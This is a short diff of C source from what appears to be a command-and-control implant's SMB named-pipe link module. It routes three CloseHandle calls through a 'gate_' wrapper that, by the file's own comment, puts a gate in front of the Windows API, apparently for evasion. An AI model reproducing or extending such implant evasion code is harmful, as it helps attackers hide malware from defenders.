@@ -1,5 +1,6 @@
 #include "beacon.h"
 #include "spawn_trace.h"
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include "channel.h"
 #include "commands.h"
 #include "security.h"
@@ -71,7 +72,7 @@ void link_start(char * pipename, void(*callback)(char * buffer, int length, int 
 		return;
 
 	DisconnectNamedPipe(pipe);
-	CloseHandle(pipe);
+	gate_CloseHandle(pipe);
 	return;
 
 cleanup:
@@ -79,7 +80,7 @@ cleanup:
 
 	/* cleanup, because we failed */
 	DisconnectNamedPipe(pipe);
-	CloseHandle(pipe);
+	gate_CloseHandle(pipe);
 }
 
 /*
@@ -169,7 +170,7 @@ int link_channel_smb_write(void * thisp, char * buffer, int length) {
 void link_channel_smb_close(void * thisp) {
 	LCHANNEL * inst = (LCHANNEL *)thisp;
 	DisconnectNamedPipe(inst->pipe);
-	CloseHandle(inst->pipe);
+	gate_CloseHandle(inst->pipe);
 }
 
 void link_channel_smb_flush(void * thisp) {
